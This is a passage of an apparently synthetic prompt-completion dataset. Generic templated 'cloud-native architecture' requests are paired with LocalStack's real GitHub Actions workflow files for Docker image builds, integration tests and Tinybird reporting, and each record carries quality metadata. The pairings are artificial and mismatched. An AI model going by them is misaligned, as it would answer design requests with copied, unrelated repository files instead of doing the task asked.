env.PLATFORM_NAME_AMD64 }}\n        run: |\n          # Push to Docker Hub\n          ./bin/docker-helper.sh push\n          # Push to Amazon Public ECR\n          TARGET_IMAGE_NAME=\"public.ecr.aws/localstack/localstack\" ./bin/docker-helper.sh push\n\n      - name: Load Localstack ${{ env.PLATFORM_NAME_ARM64 }} Docker Image\n        uses: ./.github/actions/load-localstack-docker-from-artifacts\n        with:\n          platform: ${{ env.PLATFORM_NAME_ARM64 }}\n\n      - name: Push ${{ env.PLATFORM_NAME_ARM64 }} Docker Image\n        env:\n          DOCKER_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}\n          DOCKER_PASSWORD: ${{ secrets.DOCKERHUB_PASSWORD }}\n          PLATFORM: ${{ env.PLATFORM_NAME_ARM64 }}\n        run: |\n          # Push to Docker Hub\n          ./bin/docker-helper.sh push\n          # Push to Amazon Public ECR\n          TARGET_IMAGE_NAME=\"public.ecr.aws/localstack/localstack\" ./bin/docker-helper.sh push\n\n      - name: Push Multi-Arch Manifest\n        env:\n          DOCKER_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}\n          DOCKER_PASSWORD: ${{ secrets.DOCKERHUB_PASSWORD }}\n        run: |\n          # Push to Docker Hub\n          ./bin/docker-helper.sh push-manifests\n          # Push to Amazon Public ECR\n          IMAGE_NAME=\"public.ecr.aws/localstack/localstack\" ./bin/docker-helper.sh push-manifests\n\n      - name: Publish dev release\n        env:\n          TWINE_USERNAME: ${{ secrets.TWINE_USERNAME }}\n          TWINE_PASSWORD: ${{ secrets.TWINE_PASSWORD }}\n        run: |\n          if git describe --exact-match --tags >/dev/null 2>&1; then\n            echo \"not publishing a dev release as this is a tagged commit\"\n          else\n            make install-runtime publish || echo \"dev release failed (maybe it is already published)\"\n          fi\n\n  push-to-tinybird:\n    name: Push Workflow Status to Tinybird\n    if: always() && ( github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/v') ) && github.repository == 'localstack/localstack'\n    runs-on: ubuntu-latest\n    needs:\n      - test\n    steps:\n      - name: Push to Tinybird\n        uses: localstack/tinybird-workflow-push@v3\n        with:\n          # differentiate between \"acceptance only\" and \"proper / full\" runs\n          workflow_id: ${{ (inputs.onlyAcceptanceTests == true || github.event_name == 'push') && 'tests_acceptance' || 'tests_full' }}\n          tinybird_token: ${{ secrets.TINYBIRD_CI_TOKEN }}\n          github_token: ${{ secrets.GITHUB_TOKEN }}\n          tinybird_datasource: \"ci_workflows\"\n          # determine the output only for the jobs that are direct dependencies of this job (to avoid issues with workflow_call embeddings)\n          outcome: ${{ ((contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled')) && 'failure') || 'success' }}\n\n  cleanup:\n    name: \"Cleanup\"\n    runs-on: ubuntu-latest\n    # only remove the image artifacts if the build was successful\n    # (this allows a re-build of failed jobs until for the time of the retention period)\n    if: always() && !failure() && !cancelled()\n    needs: push\n    steps:\n      - uses: geekyeggo/delete-artifact@v5\n        with:\n          # delete the docker images shared within the jobs (storage on GitHub is expensive)\n          name: |\n            localstack-docker-image-*\n            lambda-common-*\n          failOnError: false\n          token: ${{ secrets.GITHUB_TOKEN }}\n", "metadata": {"source": "github.com/localstack/localstack", "file_path": ".github/workflows/aws-main.yml", "language": "yaml", "complexity": "complex", "star_count": 59801, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 304}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: AWS / MA/MR tests\n\non:\n  schedule:\n    - cron: 0 1 * * MON-FRI\n  pull_request:\n    paths:\n      - '.github/workflows/aws-mamr.yml'\n      - '.github/workflows/aws-tests.yml'\n      - '.github/actions/**'\n  workflow_dispatch:\n    inputs:\n      disableCaching:\n        description: 'Disable Caching'\n        required: false\n        type: boolean\n        default: false\n      PYTEST_LOGLEVEL:\n        type: choice\n        description: Loglevel for PyTest\n        options:\n          - DEBUG\n          - INFO\n          - WARNING\n          - ERROR\n          - CRITICAL\n        default: WARNING\n\nenv:\n  IMAGE_NAME: \"localstack/localstack\"\n\n\n\njobs:\n  generate-random-creds:\n    name: \"Generate random AWS credentials\"\n    runs-on: ubuntu-latest\n    outputs:\n      region: ${{ steps.generate-aws-values.outputs.region }}\n      account_id: ${{ steps.generate-aws-values.outputs.account_id }}\n    steps:\n      - name: Generate values\n        id: generate-aws-values\n        run: |\n          # Generate a random 12-digit number for TEST_AWS_ACCOUNT_ID\n          ACCOUNT_ID=$(shuf -i 100000000000-999999999999 -n 1)\n          echo \"account_id=$ACCOUNT_ID\" >> $GITHUB_OUTPUT\n          # Set TEST_AWS_REGION_NAME to a random AWS region other than us-east-1\n          REGIONS=(\"us-east-2\" \"us-west-1\" \"us-west-2\" \"ap-southeast-2\" \"ap-northeast-1\" \"eu-central-1\" \"eu-west-1\")\n          REGION=${REGIONS[RANDOM % ${#REGIONS[@]}]}\n          echo \"region=$REGION\" >> $GITHUB_OUTPUT\n\n  test-ma-mr:\n    name: \"Run integration tests\"\n    needs: generate-random-creds\n    uses: ./.github/workflows/aws-tests.yml\n    with:\n      disableCaching: ${{ inputs.disableCaching == true }}\n      PYTEST_LOGLEVEL: ${{ inputs.PYTEST_LOGLEVEL }}\n      testAWSRegion: ${{ needs.generate-random-creds.outputs.region }}\n      testAWSAccountId: ${{ needs.generate-random-creds.outputs.account_id }}\n      testAWSAccessKeyId: ${{ needs.generate-random-creds.outputs.account_id }}\n    secrets:\n      DOCKERHUB_PULL_USERNAME: ${{ secrets.DOCKERHUB_PULL_USERNAME }}\n      DOCKERHUB_PULL_TOKEN: ${{ secrets.DOCKERHUB_PULL_TOKEN }}\n      TINYBIRD_CI_TOKEN: ${{ secrets.TINYBIRD_CI_TOKEN }}\n\n  push-to-tinybird:\n    name: Push Workflow Status to Tinybird\n    if: always() && ( github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/v') ) && github.repository == 'localstack/localstack'\n    runs-on: ubuntu-latest\n    needs:\n      - test-ma-mr\n    steps:\n      - name: Push to Tinybird\n        uses: localstack/tinybird-workflow-push@v3\n        with:\n          workflow_id: ${{ 'tests_mamr' }}\n          tinybird_token: ${{ secrets.TINYBIRD_CI_TOKEN }}\n          github_token: ${{ secrets.GITHUB_TOKEN }}\n          tinybird_datasource: \"ci_workflows\"\n          # determine the output only for the jobs that are direct dependencies of this job (to avoid issues with workflow_call embeddings)\n          outcome: ${{ ((contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled')) && 'failure') || 'success' }}\n", "metadata": {"source": "github.com/localstack/localstack", "file_path": ".github/workflows/aws-tests-mamr.yml", "language": "yaml", "complexity": "simple", "star_count": 59801, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 84}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: AWS / S3 Image Integration Tests\n\non:\n  push:\n    paths:\n      - .github/workflows/tests-s3-image.yml\n      - localstack-core/localstack/aws/*.py\n      - localstack-core/localstack/aws/handlers/*¨\n      - localstack-core/localstack/aws/protocol/**\n      - localstack-core/localstack/aws/serving/**\n      - localstack-core/localstack/aws/api/s3/**\n      - localstack-core/localstack/http/**\n      - localstack-core/localstack/runtime/**\n      - localstack-core/localstack/services/s3/**\n      - localstack-core/localstack/*.py\n      - tests/aws/services/s3/**\n      - Dockerfile.s3\n      - requirements-*.txt\n      - setup.cfg\n      - Makefile\n    branches:\n      - main\n  pull_request:\n    paths:\n      - .github/workflows/tests-s3-image.yml\n      - localstack-core/localstack/aws/*.py\n      - localstack-core/localstack/aws/handlers/*¨\n      - localstack-core/localstack/aws/protocol/**\n      - localstack-core/localstack/aws/serving/**\n      - localstack-core/localstack/aws/api/s3/**\n      - localstack-core/localstack/http/**\n      - localstack-core/localstack/runtime/**\n      - localstack-core/localstack/services/s3/**\n      - localstack-core/localstack/*.py\n      - tests/aws/services/s3/**\n      - Dockerfile.s3\n      - requirements-*.txt\n      - setup.cfg\n      - Makefile\n  workflow_dispatch:\n    inputs:\n      publishDockerImage:\n        description: 'Publish S3-only images on Dockerhub'\n        required: false\n        type: boolean\n        default: false\n      PYTEST_LOGLEVEL:\n        type: choice\n        description: Loglevel for PyTest\n        options:\n        - DEBUG\n        - INFO\n        - WARNING\n        - ERROR\n        - CRITICAL\n        default: WARNING\n\n# Only one pull-request triggered run should be executed at a time\n# (head_ref is only set for PR events, otherwise fallback to run_id which differs for every run).\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.head_ref || github.run_id }}\n  cancel-in-progress: true\n\nenv:\n  # Configure PyTest log level\n  PYTEST_LOGLEVEL: \"${{ inputs.PYTEST_LOGLEVEL || 'WARNING' }}\"\n  # Set non-job-specific environment variables for pytest-tinybird\n  TINYBIRD_URL: https://api.tinybird.co\n  TINYBIRD_DATASOURCE: community_tests_s3_image\n  TINYBIRD_TOKEN: ${{ secrets.TINYBIRD_CI_TOKEN }}\n  CI_COMMIT_BRANCH: ${{ github.head_ref || github.ref_name }}\n  CI_COMMIT_SHA: ${{ github.sha }}\n  CI_JOB_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}/attempts/${{ github.run_attempt }}\n  # report to tinybird if executed on main\n  TINYBIRD_PYTEST_ARGS: \"${{ github.repository == 'localstack/localstack' && github.ref == 'refs/heads/main' && '--report-to-tinybird ' || '' }}\"\n\n\njobs:\n  build-test-s3:\n    strategy:\n      matrix:\n        include:\n          - arch: amd64\n            runner: ubuntu-latest\n          - arch: arm64\n            runner: buildjet-2vcpu-ubuntu-2204-arm\n    name: \"Build and Test S3 image\"\n    env:\n      PLATFORM: ${{ matrix.arch }}\n      IMAGE_NAME: \"localstack/localstack\"\n      DEFAULT_TAG: \"s3-latest\"\n      # Set job-specific environment variables for pytest-tinybird\n      CI_JOB_NAME: ${{ github.job }}\n      CI_JOB_ID: ${{ github.job }}\n    runs-on: ${{ matrix.runner }}\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n        with:\n          # setuptools_scm requires the git history (at least until the last tag) to determine the version\n          fetch-depth: 0\n\n      - name: Login to Docker Hub\n        uses: docker/login-action@v3\n        # If this is triggered by a pull_request, make sure the PR head repo name is the same as the target repo name\n        # (i.e. do not execute job for workflows coming from forks)\n        if: >-\n          (\n            github.event_name != 'pull_request' ||\n            github.event.pull_request.head.repo.full_name == github.repository\n          )\n        with:\n          username: ${{ secrets.DOCKERHUB_USERNAME }}\n          password: ${{ secrets.DOCKERHUB_PASSWORD }}\n\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: '3.11'\n\n      - name: Install docker build dependencies\n        run: pip install --upgrade setuptools setuptools_scm\n\n      - name: Build S3 Docker Image\n        env:\n          DOCKERFILE: \"./Dockerfile.s3\"\n        run: ./bin/docker-helper.sh build\n\n      - name: Run S3 Image tests\n        timeout-minutes: 10\n        env:\n          PYTEST_ARGS: \"${{ env.TINYBIRD_PYTEST_ARGS }}-o junit_family=legacy --junitxml=target/pytest-junit-s3-image-${{ matrix.arch }}.xml\"\n          TEST_PATH: \"tests/aws/services/s3\"\n          DEBUG: 1\n        run: |\n          mkdir target\n          make docker-run-tests-s3-only\n\n      - name: Archive Test Results\n        uses: actions/upload-artifact@v4\n        if: success() || failure()\n        with:\n          name: test-results-s3-image-${{ matrix.arch }}\n          path: target/pytest-junit-s3-image-${{ matrix.arch }}.xml\n          retention-days: 30\n\n      - name: Save the S3 image\n        id: save-image\n        run: ./bin/docker-helper.sh save\n\n      - name: Store Docker image as artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: localstack-s3-image-${{ matrix.arch }}\n          path: ${{ steps.save-image.outputs.IMAGE_FILENAME }}\n          retention-days: 1\n\n  publish-test-results:\n    name: \"Publish S3 Image Test Results\"\n    needs: build-test-s3\n    runs-on: ubuntu-latest\n    permissions:\n      checks: write\n      pull-requests: write\n      contents: read\n      issues: read\n    # If this is triggered by a pull_request, make sure the PR head repo name is the same as the target repo name\n    # (i.e. do not execute job for workflows coming from forks)\n    if: >-\n      (success() || failure()) && (\n        github.event_name != 'pull_request' ||\n        github.event.pull_request.head.repo.full_name == github.repository\n      )\n    steps:\n      - name: Download AMD64 Results\n        uses: actions/download-artifact@v4\n        with:\n          name: test-results-s3-image-amd64\n\n      - name: Download ARM64 Results\n        uses: actions/download-artifact@v4\n        with:\n          name: test-results-s3-image-arm64\n\n      - name: Publish S3 Image Test Results\n        uses: EnricoMi/publish-unit-test-result-action@v2\n        with:\n          files: pytest-junit-*.xml\n          check_name: \"S3 Image Test Results (AMD64 / ARM64)\"\n          action_fail_on_inconclusive: true\n\n  push-s3-image:\n    name: \"Push S3 images and manifest\"\n    runs-on: ubuntu-latest\n    needs:\n      - build-test-s3\n    if: inputs.publishDockerImage\n    env:\n      IMAGE_NAME: \"localstack/localstack\"\n      DEFAULT_TAG: \"s3-latest\"\n    steps:\n      - name: Login to Docker Hub\n        uses: docker/login-action@v3\n        with:\n          username: ${{ secrets.DOCKERHUB_USERNAME }}\n          password: ${{ secrets.DOCKERHUB_PASSWORD }}\n\n      - name: Checkout\n        uses: actions/checkout@v4\n\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: '3.11'\n\n      - name: Install docker build dependencies\n        run: pip install --upgrade setuptools setuptools_scm\n\n      - name: Download AMD64 image\n        uses: actions/download-artifact@v4\n        with:\n          name: localstack-s3-image-amd64\n\n      - name: Download ARM64 image\n        uses: actions/download-artifact@v4\n        with:\n          name: localstack-s3-image-arm64\n\n      - name: Load AMD64 image\n        env:\n          PLATFORM: amd64\n        run: ./bin/docker-helper.sh load\n\n      - name: Push AMD64 image\n        env:\n          DOCKER_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}\n          DOCKER_PASSWORD: ${{ secrets.DOCKERHUB_PASSWORD }}\n          PLATFORM: amd64\n        run: ./bin/docker-helper.sh push\n\n      - name: Load ARM64 image\n        env:\n          PLATFORM: arm64\n        run: ./bin/docker-helper.sh load\n\n      - name: Push ARM64 image\n        env:\n          DOCKER_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}\n          DOCKER_PASSWORD: ${{ secrets.DOCKERHUB_PASSWORD }}\n          PLATFORM: arm64\n        run: ./bin/docker-helper.sh push\n\n      - name: Create and push manifest\n        env:\n          DOCKER_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}\n          DOCKER_PASSWORD: ${{ secrets.DOCKERHUB_PASSWORD }}\n        run: ./bin/docker-helper.sh push-manifests\n\n  cleanup:\n    name: \"Clean up\"\n    runs-on: ubuntu-latest\n    if: success()\n    needs: push-s3-image\n    steps:\n      - uses: geekyeggo/delete-artifact@v5\n        with:\n          name: localstack-s3-image-*\n          failOnError: false\n\n  push-to-tinybird:\n    if: always() && github.ref == 'refs/heads/main' && github.repository == 'localstack/localstack'\n    runs-on: ubuntu-latest\n    needs: push-s3-image\n    steps:\n      - name: Push to Tinybird\n        uses: localstack/tinybird-workflow-push@v3\n        with:\n          workflow_id: \"tests_s3_image\"\n          tinybird_token: ${{ secrets.TINYBIRD_CI_TOKEN }}\n          github_token: ${{ secrets.GITHUB_TOKEN }}\n          tinybird_datasource: \"ci_workflows\"\n", "metadata": {"source": "github.com/localstack/localstack", "file_path": ".github/workflows/aws-tests-s3-image.yml", "language": "yaml", "complexity": "complex", "star_count": 59801, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 282}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: AWS / Integration Tests\n\non:\n  workflow_dispatch:\n    inputs:\n      disableCaching:\n        description: 'Disable Caching'\n        required: false\n        type: boolean\n        default: false\n      PYTEST_LOGLEVEL:\n        type: choice\n        description: Loglevel for PyTest\n        options:\n          - DEBUG\n          - INFO\n          - WARNING\n          - ERROR\n          - CRITICAL\n        default: WARNING\n      disableTestSelection:\n        description: 'Disable Test Selection'\n        required: false\n        type: boolean\n        default: false\n      randomize-aws-credentials:\n        description: 'Randomize AWS credentials'\n        default: false\n        required: false\n        type: boolean\n      onlyAcceptanceTests:\n        description: 'Run only acceptance tests'\n        default: false\n        required: false\n        type: boolean\n      forceARMTests:\n        description: 'Run the ARM64 tests'\n        default: false\n        required: false\n        type: boolean\n      testAWSRegion:\n        description: 'AWS test region'\n        required: false\n        type: string\n        default: 'us-east-1'\n      testAWSAccountId:\n        description: 'AWS test account ID'\n        required: false\n        type: string\n        default: '000000000000'\n      testAWSAccessKeyId:\n        description: 'AWS test access key ID'\n        required: false\n        type: string\n        default: 'test'\n  workflow_call:\n    inputs:\n      disableCaching:\n        description: 'Disable Caching'\n        required: false\n        type: boolean\n        default: false\n      PYTEST_LOGLEVEL:\n        type: string\n        required: false\n        description: Loglevel for PyTest\n        default: WARNING\n      disableTestSelection:\n        description: 'Disable Test Selection'\n        required: false\n        type: boolean\n        default: false\n      randomize-aws-credentials:\n        description: \"Randomize AWS credentials\"\n        default: false\n        required: false\n        type: boolean\n      onlyAcceptanceTests:\n        description: \"Run only acceptance tests\"\n        default: false\n        required: false\n        type: boolean\n      forceARMTests:\n        description: 'Run the ARM64 tests'\n        default: false\n        required: false\n        type: boolean\n      testAWSRegion:\n        description: 'AWS test region'\n        required: false\n        type: string\n        default: 'us-east-1'\n      testAWSAccountId:\n        description: 'AWS test account ID'\n        required: false\n        type: string\n        default: '000000000000'\n      testAWSAccessKeyId:\n        description: 'AWS test access key ID'\n        required: false\n        type: string\n        default: 'test'\n    secrets:\n      DOCKERHUB_PULL_USERNAME:\n        description: 'A DockerHub username - Used to avoid rate limiting issues.'\n        required: true\n      DOCKERHUB_PULL_TOKEN:\n        description: 'A DockerHub token - Used to avoid rate limiting issues.'\n        required: true\n      TINYBIRD_CI_TOKEN:\n        description: 'Token for accessing our tinybird ci analytics workspace.'\n        required: true\n\nenv:\n  PYTEST_LOGLEVEL: ${{ inputs.PYTEST_LOGLEVEL || 'WARNING' }}\n  IMAGE_NAME: \"localstack/localstack\"\n  TESTSELECTION_PYTEST_ARGS: \"${{ !inputs.disableTestSelection && '--path-filter=dist/testselection/test-selection.txt ' || '' }}\"\n  TEST_AWS_REGION_NAME: ${{ inputs.testAWSRegion }}\n  TEST_AWS_ACCOUNT_ID: ${{ inputs.testAWSAccountId }}\n  TEST_AWS_ACCESS_KEY_ID: ${{ inputs.testAWSAccessKeyId }}\n  # Set non-job-specific environment variables for pytest-tinybird\n  TINYBIRD_URL: https://api.tinybird.co\n  TINYBIRD_DATASOURCE: raw_tests\n  TINYBIRD_TOKEN: ${{ secrets.TINYBIRD_CI_TOKEN }}\n  TINYBIRD_TIMEOUT: 5\n  CI_REPOSITORY_NAME: localstack/localstack\n  # differentiate between \"acceptance\", \"mamr\" and \"full\" runs\n  CI_WORKFLOW_NAME: ${{ inputs.onlyAcceptanceTests && 'tests_acceptance'\n    || inputs.testAWSAccountId != '000000000000' && 'tests_mamr'\n    || 'tests_full' }}\n  CI_COMMIT_BRANCH: ${{ github.head_ref || github.ref_name }}\n  CI_COMMIT_SHA: ${{ github.sha }}\n  CI_JOB_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}/attempts/${{ github.run_attempt }}\n  # report to tinybird if executed on main\n  TINYBIRD_PYTEST_ARGS: \"${{ github.repository == 'localstack/localstack' && ( github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/v') ) && '--report-to-tinybird ' || '' }}\"\n  DOCKER_PULL_SECRET_AVAILABLE: ${{ secrets.DOCKERHUB_PULL_USERNAME != '' && secrets.DOCKERHUB_PULL_TOKEN != '' && 'true' || 'false' }}\n\n\n\njobs:\n  build:\n    name: \"Build Docker Image (${{ contains(matrix.runner, 'arm') && 'ARM64' || 'AMD64' }})\"\n    needs:\n      - test-preflight\n    strategy:\n      matrix:\n        runner:\n          - ubuntu-latest\n          - ubuntu-24.04-arm\n        exclude:\n          # skip the ARM integration tests in forks, and also if not on main/upgrade-dependencies and forceARMTests is not set to true\n          # TODO ARM runners are not yet available for private repositories; skip them for potential private forks\n          - runner: ${{ ((github.repository != 'localstack/localstack') || (github.ref != 'refs/heads/main' && !startsWith(github.ref, 'refs/tags/v') && github.ref != 'upgrade-dependencies' && inputs.forceARMTests == false)) && 'ubuntu-24.04-arm' || ''}}\n      fail-fast: false\n    runs-on: ${{ matrix.runner }}\n    steps:\n      - name: Determine Runner Architecture\n        shell: bash\n        run: echo \"PLATFORM=${{ (runner.arch == 'X64' && 'amd64') || (runner.arch == 'ARM64' && 'arm64') || '' }}\" >> $GITHUB_ENV\n\n      - name: Checkout\n        uses: actions/checkout@v4\n        with:\n          path: localstack\n          # setuptools_scm requires the git history (at least until the last tag) to determine the version\n          fetch-depth: 0\n\n      - name: Build Image\n        uses: localstack/localstack/.github/actions/build-image@main\n        with:\n          disableCaching: ${{ inputs.disableCaching == true && 'true' || 'false' }}\n          dockerhubPullUsername: ${{ secrets.DOCKERHUB_PULL_USERNAME }}\n          dockerhubPullToken: ${{ secrets.DOCKERHUB_PULL_TOKEN }}\n\n      - name: Restore Lambda common runtime packages\n        id: cached-lambda-common-restore\n        if: inputs.disableCaching != true\n        uses: actions/cache/restore@v4\n        with:\n          path: localstack/tests/aws/services/lambda_/functions/common\n          key: common-it-${{ runner.os }}-${{ runner.arch }}-lambda-common-${{ hashFiles('localstack/tests/aws/services/lambda_/functions/common/**/src/*', 'localstack/tests/aws/services/lambda_/functions/common/**/Makefile') }}\n\n      - name: Prebuild lambda common packages\n        run: ./localstack/scripts/build_common_test_functions.sh `pwd`/localstack/tests/aws/services/lambda_/functions/common\n\n      - name: Save Lambda common runtime packages\n        if: inputs.disableCaching != true\n        uses: actions/cache/save@v4\n        with:\n          path: localstack/tests/aws/services/lambda_/functions/common\n          key: ${{ steps.cached-lambda-common-restore.outputs.cache-primary-key }}\n\n      - name: Archive Lambda common packages\n        uses: actions/upload-artifact@v4\n        with:\n          name: lambda-common-${{ env.PLATFORM }}\n          path: |\n            localstack/tests/aws/services/lambda_/functions/common\n          retention-days: 1\n\n\n  test-preflight:\n    name: \"Preflight & Unit-Tests\"\n    runs-on: ubuntu-latest\n    outputs:\n      cloudwatch-v1: ${{ steps.changes.outputs.cloudwatch-v1 }}\n      dynamodb-v2: ${{ steps.changes.outputs.dynamodb-v2 }}\n      events-v1: ${{ steps.changes.outputs.events-v1 }}\n      cloudformation-v2: ${{ steps.changes.outputs.cloudformation-v2 }}\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n        with:\n          # setuptools_scm requires the git history (at least until the last tag) to determine the version\n          fetch-depth: 0\n\n      - name: Prepare Local Test Environment\n        uses: ./.github/actions/setup-tests-env\n\n      - name: Linting\n        run: make lint\n\n      - name: Check AWS compatibility markers\n        run: make check-aws-markers\n\n      - name: Determine Test Selection\n        if: ${{ env.TESTSELECTION_PYTEST_ARGS }}\n        run: |\n          source .venv/bin/activate\n          if [ -z \"${{ github.event.pull_request.base.sha }}\" ]; then\n            echo \"Do test selection based on branch name\"\n          else\n            echo \"Do test selection based on Pull Request event\"\n            SCRIPT_OPTS=\"--base-commit-sha ${{ github.event.pull_request.base.sha }} --head-commit-sha ${{ github.event.pull_request.head.sha }}\"\n          fi\n          source .venv/bin/activate\n          python -m localstack.testing.testselection.scripts.generate_test_selection $(pwd) dist/testselection/test-selection.txt $SCRIPT_OPTS || (mkdir -p dist/testselection && echo \"SENTINEL_ALL_TESTS\" >> dist/testselection/test-selection.txt)\n          echo \"Test selection:\"\n          cat dist/testselection/test-selection.txt\n\n      - name: Archive Test Selection\n        if: ${{ env.TESTSELECTION_PYTEST_ARGS }}\n        uses: actions/upload-artifact@v4\n        with:\n          name: test-selection\n          path: |\n            dist/testselection/test-selection.txt\n          retention-days: 1\n\n      # This step determines which services were affected by changes of the modified files\n      # The output from this step is later used in combination with the test-selection file\n      #\n      # The test-selection file specifies which tests to run for each service,\n      # while this step allows skipping entire jobs when no relevant services have changed\n      - name: Determine services affected by change\n        uses: dorny/paths-filter@v3.0.2\n        id: changes\n        with:\n          token: ${{ secrets.GITHUB_TOKEN }}\n          filters: |\n            cloudwatch-v1:\n               - 'tests/aws/services/cloudwatch/**'\n            dynamodb-v2:\n               - 'tests/aws/services/dynamodb/**'\n               - 'tests/aws/services/dynamodbstreams/**'\n               - 'tests/aws/services/lambda_/event_source_mapping/test_lambda_integration_dynamodbstreams.py'\n            events-v1:\n               - 'tests/aws/services/events/**'\n            cloudformation-v2:\n               - 'tests/aws/services/cloudformation/v2/**'\n\n      - name: Run Unit Tests\n        timeout-minutes: 8\n        env:\n          # add the GitHub API token to avoid rate limit issues\n          GITHUB_API_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          DEBUG: 1\n          TEST_PATH: \"tests/unit\"\n          JUNIT_REPORTS_FILE: \"pytest-junit-unit.xml\"\n          PYTEST_ARGS: \"${{ env.TINYBIRD_PYTEST_ARGS }} -o junit_suite_name=unit-tests\"\n          COVERAGE_FILE: \".coverage.unit\"\n          # Set job-specific environment variables for pytest-tinybird\n          CI_JOB_NAME: ${{ github.job }}-unit\n          CI_JOB_ID: ${{ github.job }}-unit\n        run: make test-coverage\n\n      - name: Archive Test Results\n        uses: actions/upload-artifact@v4\n        if: success() || failure()\n        with:\n          name: test-results-preflight\n          include-hidden-files: true\n          path: |\n            pytest-junit-unit.xml\n            .coverage.unit\n          retention-days: 30\n\n  publish-preflight-test-results:\n    name: Publish Preflight- & Unit-Test Results\n    needs: test-preflight\n    runs-on: ubuntu-latest\n    permissions:\n      checks: write\n      pull-requests: write\n      contents: read\n      issues: read\n    # execute on success or failure, but not if the workflow is cancelled or any of the dependencies has been skipped\n    if: always() && !cancelled() && !contains(needs.*.result, 'skipped')\n    steps:\n      - name: Download Artifacts\n        uses: actions/download-artifact@v4\n        with:\n          pattern: test-results-preflight\n\n      - name: Publish Preflight- & Unit-Test Results\n        uses: EnricoMi/publish-unit-test-result-action@v2\n        if: success() || failure()\n        with:\n          files: |\n            test-results-preflight/*.xml\n          check_name: \"Test Results ${{ inputs.testAWSAccountId != '000000000000' && '(MA/MR) ' || ''}}- Preflight, Unit\"\n          test_file_prefix: \"-/opt/code/localstack/\"\n          action_fail_on_inconclusive: true\n\n\n  test-integration:\n    name: \"Integration Tests (${{ contains(matrix.runner, 'arm') && 'ARM64' || 'AMD64' }} - ${{ matrix.group }})\"\n    if: ${{ !inputs.onlyAcceptanceTests }}\n    needs:\n      - build\n      - test-preflight\n    strategy:\n      matrix:\n        group: [ 1, 2, 3, 4 ]\n        runner:\n          - ubuntu-latest\n          - ubuntu-24.04-arm\n        exclude:\n          # skip the ARM integration tests in forks, and also if not on main/upgrade-dependencies and forceARMTests is not set to true\n          # TODO ARM runners are not yet available for private repositories; skip them for potential private forks\n          - runner: ${{ ((github.repository != 'localstack/localstack') || (github.ref != 'refs/heads/main' && !startsWith(github.ref, 'refs/tags/v') && github.ref != 'upgrade-dependencies' && inputs.forceARMTests == false)) && 'ubuntu-24.04-arm' || ''}}\n      fail-fast: false\n    runs-on: ${{ matrix.runner }}\n    env:\n      # Set job-specific environment variables for pytest-tinybird\n      CI_JOB_NAME: ${{ github.job }}-${{ contains(matrix.runner, 'arm') && 'arm' || 'amd' }}\n      CI_JOB_ID: ${{ github.job }}-${{ contains(matrix.runner, 'arm') && 'arm' || 'amd' }}\n    steps:\n      - name: Determine Runner Architecture\n        shell: bash\n        run: echo \"PLATFORM=${{ (runner.arch == 'X64' && 'amd64') || (runner.arch == 'ARM64' && 'arm64') || '' }}\" >> $GITHUB_ENV\n\n      - name: Login to Docker Hub\n        # login to DockerHub to avoid rate limiting issues on custom runners\n        if: github.repository_owner == 'localstack' && env.DOCKER_PULL_SECRET_AVAILABLE == 'true'\n        uses: docker/login-action@v3\n        with:\n          username: ${{ secrets.DOCKERHUB_PULL_USERNAME }}\n          password: ${{ secrets.DOCKERHUB_PULL_TOKEN }}\n\n      - name: Set environment\n        if: ${{ inputs.testEnvironmentVariables != ''}}\n        shell: bash\n        run: |\n          echo \"${{ inputs.testEnvironmentVariables }}\" | sed \"s/;/\\n/\" >> $GITHUB_ENV\n\n      - name: Checkout\n        uses: actions/checkout@v4\n        with:\n          # setuptools_scm requires the git history (at least until the last tag) to determine the version\n          fetch-depth: 0\n\n      - name: Download Lambda Common packages\n        uses: actions/download-artifact@v4\n        with:\n          name: 